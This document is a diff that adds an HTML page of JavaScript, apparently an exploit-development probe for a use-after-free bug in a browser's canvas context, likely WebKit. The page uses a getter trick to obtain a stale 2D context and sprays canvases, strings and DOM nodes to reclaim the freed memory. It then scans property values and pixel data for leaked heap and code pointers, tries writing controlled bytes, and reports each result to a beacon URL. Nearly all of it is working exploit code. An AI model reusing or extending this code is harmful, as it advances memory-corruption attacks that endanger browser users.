@@ -1,0 +1,245 @@
+<!--
+  P682v12: Dangling pointer reads after freeing only the alias canvas.
+  Tests: staleCtx.canvas after free, getImageData on stale buffer,
+  save/restore state stack, and targeted string reclaim.
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P682v12</title></head>
+<body><pre id="out">P682v12</pre>
+<script>
+'use strict';
+var O=document.getElementById('out');
+function say(s){O.textContent+='\n'+s;}
+var _imgs=[];for(var i=0;i<300;i++)_imgs.push(new Image());
+var _ix=0;
+function bk(tag,d){
+  var msg='P682-'+tag+': '+String(d).slice(0,900);
+  say(msg);
+  try{_imgs[_ix++%300].src='/beacon?m='+encodeURIComponent(msg)+'&t='+Date.now();}catch(e){}
+}
+try{delete FontFace.prototype.then;}catch(e){}
+bk('BOOT','p682v12');
+
+var _b8=new ArrayBuffer(8),_f64=new Float64Array(_b8),_u32=new Uint32Array(_b8);
+function f2i(f){_f64[0]=f;return [_u32[1],_u32[0]];}
+function hex64(f){var p=f2i(f);return '0x'+('00000000'+p[0].toString(16)).slice(-8)+('00000000'+p[1].toString(16)).slice(-8);}
+
+function triggerCanvasUAF(w,h){
+  var c=document.createElement('canvas');
+  c.width=w;c.height=h;
+  var stale=null;
+  var opts={};
+  Object.defineProperty(opts,'alpha',{get:function(){
+    stale=c.getContext('2d');
+    return true;
+  }});
+  c.getContext('bitmaprenderer',opts);
+  return {staleCtx:stale, canvas:c};
+}
+
+function main(){
+  /* A: UAF + same-type reclaim */
+  bk('A0','uaf+reclaim');
+  var uaf=triggerCanvasUAF(48,1);
+  var staleCtx=uaf.staleCtx;
+  if(!staleCtx){bk('FAIL','no-stale');return;}
+
+  var sprayCtxs=[];
+  for(var i=0;i<300;i++){
+    var sc=document.createElement('canvas');
+    sc.width=48;sc.height=1;
+    var sctx=sc.getContext('2d');
+    sctx.lineWidth=9999.99;
+    sprayCtxs.push({canvas:sc,ctx:sctx});
+  }
+
+  var lw;try{lw=staleCtx.lineWidth;}catch(e){lw=-1;}
+  var aliasIdx=-1,alias=null,aliasCanvas=null;
+  if(Math.abs(lw-9999.99)<0.01){
+    for(var i=0;i<sprayCtxs.length;i++) sprayCtxs[i].ctx.lineWidth=1000+i;
+    var lw2;try{lw2=staleCtx.lineWidth;}catch(e){lw2=-1;}
+    aliasIdx=Math.round(lw2)-1000;
+    if(aliasIdx>=0&&aliasIdx<sprayCtxs.length){
+      alias=sprayCtxs[aliasIdx].ctx;
+      aliasCanvas=sprayCtxs[aliasIdx].canvas;
+      bk('A1','idx='+aliasIdx);
+    }
+  }
+  if(!alias){bk('FAIL','no-alias lw='+lw);return;}
+
+  /* B: Read staleCtx.canvas BEFORE free (baseline) */
+  bk('B0','canvas-ref-before-free');
+  var canvasRef=null;
+  try{
+    canvasRef=staleCtx.canvas;
+    bk('B1','canvas='+canvasRef+' tag='+canvasRef.tagName+' w='+canvasRef.width+' h='+canvasRef.height);
+  }catch(e){bk('B1-ERR',e.message);}
+
+  /* C: Draw pattern, read pixels BEFORE free (baseline) */
+  bk('C0','pixels-before-free');
+  try{
+    alias.fillStyle='#c0ffee';alias.fillRect(0,0,48,1);
+    var id1=staleCtx.getImageData(0,0,4,1);
+    var px1='';for(var j=0;j<16;j++)px1+=('0'+id1.data[j].toString(16)).slice(-2);
+    bk('C1','px='+px1);
+  }catch(e){bk('C1-ERR',e.message);}
+
+  /* D: Free ONLY the alias canvas, keep other 299 alive */
+  bk('D0','free-alias-only');
+  /* Set marker on alias so we can detect if it's reclaimed */
+  alias.lineWidth=31337.31337;
+  /* Remove alias canvas ref */
+  sprayCtxs[aliasIdx].canvas=null;
+  sprayCtxs[aliasIdx].ctx=null;
+  alias=null;aliasCanvas=null;
+  uaf.canvas=null;
+
+  /* GC pressure - multiple rounds with different sizes */
+  for(var round=0;round<3;round++){
+    var junk=[];
+    for(var i=0;i<5000;i++) junk.push(new ArrayBuffer(256+round*128));
+    junk=null;
+  }
+
+  /* D1: Check lineWidth after free */
+  var lwAfter;try{lwAfter=staleCtx.lineWidth;}catch(e){lwAfter='ERR:'+e.message;}
+  bk('D1','lw-after-free='+lwAfter);
+  if(typeof lwAfter==='number') bk('D1h','hex='+hex64(lwAfter));
+
+  /* D2: Check canvas property after free - dangling pointer? */
+  bk('D2','canvas-after-free');
+  try{
+    var canvasAfter=staleCtx.canvas;
+    if(canvasAfter===null){
+      bk('D2r','canvas=null (cleaned up)');
+    } else if(canvasAfter===canvasRef){
+      bk('D2r','canvas=same-ref (still alive)');
+    } else {
+      bk('D2r','canvas=DIFFERENT tag='+canvasAfter.tagName+' w='+canvasAfter.width);
+    }
+  }catch(e){bk('D2-ERR','canvas read crashed: '+e.message);}
+
+  /* D3: Try getImageData after free - follows stale ImageBuffer*? */
+  bk('D3','getImageData-after-free');
+  try{
+    var id2=staleCtx.getImageData(0,0,4,1);
+    var px2='';for(var j=0;j<16;j++)px2+=('0'+id2.data[j].toString(16)).slice(-2);
+    bk('D3r','px='+px2);
+    /* Check for pointer-like values in the pixel data */
+    for(var off=0;off+8<=id2.data.length;off+=4){
+      var v=(id2.data[off+3]<<24)|(id2.data[off+2]<<16)|(id2.data[off+1]<<8)|id2.data[off];
+      var h=id2.data[off+3]>>>0;
+      if(h>0x10&&v!==0xc0ffee00&&v!==0) bk('D3p','+'+off+': 0x'+('00000000'+(v>>>0).toString(16)).slice(-8));
+    }
+  }catch(e){bk('D3-ERR',e.message);}
+
+  /* D4: Try save/restore - manipulates internal state stack */
+  bk('D4','save-restore');
+  try{
+    staleCtx.save();
+    bk('D4a','save ok');
+    staleCtx.lineWidth=12345.6789;
+    var lwSaved;try{lwSaved=staleCtx.lineWidth;}catch(e){lwSaved='ERR';}
+    bk('D4b','lw-after-set='+lwSaved);
+    staleCtx.restore();
+    bk('D4c','restore ok');
+    var lwRestored;try{lwRestored=staleCtx.lineWidth;}catch(e){lwRestored='ERR';}
+    bk('D4d','lw-after-restore='+lwRestored);
+  }catch(e){bk('D4-ERR',e.message);}
+
+  /* D5: Try putImageData to write controlled data */
+  bk('D5','putImageData-after-free');
+  try{
+    var id3=new ImageData(4,1);
+    for(var j=0;j<16;j++) id3.data[j]=0x41+j;
+    staleCtx.putImageData(id3,0,0);
+    bk('D5a','putImageData ok');
+    /* Read back */
+    var id4=staleCtx.getImageData(0,0,4,1);
+    var px4='';for(var j=0;j<16;j++)px4+=('0'+id4.data[j].toString(16)).slice(-2);
+    bk('D5b','readback='+px4);
+  }catch(e){bk('D5-ERR',e.message);}
+
+  /* E: String reclaim - WTF::StringImpl uses FastMalloc */
+  bk('E0','string-reclaim');
+  /* Try strings from 200 to 700 chars (potential context object sizes) */
+  var strs=[];
+  var testLens=[200,224,240,256,272,288,304,320,336,352,368,384,400,416,432,448,464,480,496,512,528,544,560,576,592,608,624,640,656,672,688,704];
+  for(var si=0;si<testLens.length;si++){
+    var len=testLens[si];
+    /* Create many strings of this length. Use fromCharCode to get Latin1 strings (1 byte/char in StringImpl) */
+    for(var i=0;i<50;i++){
+      var chars=[];
+      for(var j=0;j<len;j++){
+        /* Put marker pattern: encode the size index into the string data */
+        chars.push(0x30+((si*7+j)%80));
+      }
+      strs.push(String.fromCharCode.apply(null,chars));
+    }
+    /* Check if lineWidth changed */
+    var lwE;try{lwE=staleCtx.lineWidth;}catch(e){lwE='ERR';}
+    if(typeof lwE==='number'&&Math.abs(lwE-31337.31337)>0.01&&lwE!==1&&lwE!==0){
+      bk('E-HIT','String('+len+') lw='+lwE+' hex='+hex64(lwE));
+    }
+  }
+  var lwE2;try{lwE2=staleCtx.lineWidth;}catch(e){lwE2='ERR';}
+  bk('E-END','lw='+lwE2);
+
+  /* F: innerHTML reclaim - creates DOM subtrees via FastMalloc */
+  bk('F0','dom-reclaim');
+  var divs=[];
+  for(var i=0;i<200;i++){
+    var d=document.createElement('div');
+    d.setAttribute('data-x',String(77777+i));
+    d.style.cssText='width:'+i+'px;height:'+(i*2)+'px;margin:'+i+'px;padding:'+i+'px;border:'+i+'px solid red';
+    divs.push(d);
+  }
+  var lwF;try{lwF=staleCtx.lineWidth;}catch(e){lwF='ERR';}
+  bk('F-END','lw='+lwF);
+  if(typeof lwF==='number'&&Math.abs(lwF-31337.31337)>0.01&&lwF!==1) bk('F-HIT','hex='+hex64(lwF));
+
+  /* G: Read all readable properties for pointer leak */
+  bk('G0','leak-scan');
+  var props=['lineWidth','miterLimit','globalAlpha','shadowOffsetX','shadowOffsetY','shadowBlur','lineDashOffset'];
+  for(var pi=0;pi<props.length;pi++){
+    var p=props[pi];
+    var v;try{v=staleCtx[p];}catch(e){v='ERR:'+e.message;}
+    if(typeof v==='number'){
+      var bits=f2i(v);
+      /* Check for heap pointer: hi32 in 0x00000001-0x000000FF range */
+      if(bits[0]>0&&bits[0]<0x100){
+        bk('G-LEAK',p+'='+v+' hex='+hex64(v)+' (HEAP PTR?)');
+      }
+      /* Check for .text pointer: hi32 matches WebKit module */
+      if(bits[0]>=0x00000100&&bits[0]<0x7FFF0000){
+        bk('G-LEAK',p+'='+v+' hex='+hex64(v)+' (CODE PTR?)');
+      }
+    }
+  }
+
+  /* H: Try to read the internal transform matrix */
+  bk('H0','transform');
+  try{
+    /* setTransform and getTransform if available */
+    if(typeof staleCtx.getTransform==='function'){
+      var t=staleCtx.getTransform();
+      bk('H1','a='+t.a+' b='+t.b+' c='+t.c+' d='+t.d+' e='+t.e+' f='+t.f);
+      /* Check for pointer-like values */
+      var tvals=[t.a,t.b,t.c,t.d,t.e,t.f];
+      for(var ti=0;ti<tvals.length;ti++){
+        if(tvals[ti]!==0&&tvals[ti]!==1){
+          bk('H1p','t['+ti+']='+hex64(tvals[ti]));
+        }
+      }
+    } else {
+      bk('H1','getTransform not available');
+    }
+  }catch(e){bk('H1-ERR',e.message);}
+
+  bk('DONE','p682v12-complete');
+}
+
+try{main();}catch(e){bk('MAIN-CRASH',e.message);bk('DONE','crash');}
+</script>
+</body></html>
